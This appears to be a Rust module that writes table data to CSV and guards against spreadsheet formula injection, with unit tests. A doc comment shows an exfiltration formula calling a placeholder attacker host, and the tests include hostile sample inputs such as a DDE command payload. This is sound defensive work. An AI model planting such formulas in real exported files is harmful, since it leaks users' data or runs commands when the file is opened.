use anyhow::Result;
use crate::ir::table::{CellValue, TableIR};

pub fn render(table: &TableIR) -> Result<String> {
    // Use the first sheet (CSV is single-sheet)
    let sheet = table.sheets.first()
        .ok_or_else(|| anyhow::anyhow!("TableIR has no sheets"))?;

    let mut wtr = csv::Writer::from_writer(Vec::new());

    // Write header row
    if !sheet.headers.is_empty() {
        let record: Vec<String> = sheet.headers.iter().map(|h| guard_formula(h)).collect();
        wtr.write_record(&record)?;
    }

    // Write data rows
    for row in &sheet.rows {
        let record: Vec<String> = row.iter().map(|c| match c {
            // Only text cells can carry a formula. Numbers go through
            // CellValue::as_str untouched, so a value like -5 is never mangled.
            CellValue::Str(s) => guard_formula(s),
            other => other.as_str(),
        }).collect();
        wtr.write_record(&record)?;
    }

    wtr.flush()?;
    let bytes = wtr.into_inner()?;
    Ok(String::from_utf8(bytes)?)
}

/// Prefix a text cell that a spreadsheet would otherwise evaluate as a formula.
///
/// A cell such as `=HYPERLINK("http://attacker/?"&A1)` is inert inside the CSV,
/// but executes the moment the file is opened in Excel or Sheets — which is how
/// converted data usually gets looked at. A leading apostrophe is the standard
/// mitigation and forces the value to be read as text.
fn guard_formula(s: &str) -> String {
    match s.chars().next() {
        Some('=') | Some('+') | Some('-') | Some('@') | Some('\t') | Some('\r') => {
            format!("'{}", s)
        }
        _ => s.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ir::table::Sheet;

    #[test]
    fn formula_leaders_are_guarded() {
        for hostile in ["=HYPERLINK(\"http://x\")", "+cmd|calc", "@SUM(1:1)", "-2+3"] {
            assert!(guard_formula(hostile).starts_with('\''), "unguarded: {hostile}");
        }
    }

    #[test]
    fn ordinary_text_is_untouched() {
        for benign in ["alice", "a-b", "3.5", "", "hello, world"] {
            assert_eq!(guard_formula(benign), benign);
        }
    }

    #[test]
    fn negative_numbers_are_not_mangled() {
        // Numeric cells bypass the guard entirely, so -5 stays -5.
        let table = TableIR::single(Sheet {
            name: "s".into(),
            headers: vec!["n".into()],
            rows: vec![vec![CellValue::Num(-5.0)], vec![CellValue::Str("=BAD()".into())]],
        });
        let out = render(&table).unwrap();
        assert!(out.contains("\n-5\n"), "negative number was mangled: {out}");
        assert!(out.contains("'=BAD()"), "formula was not guarded: {out}");
    }
}
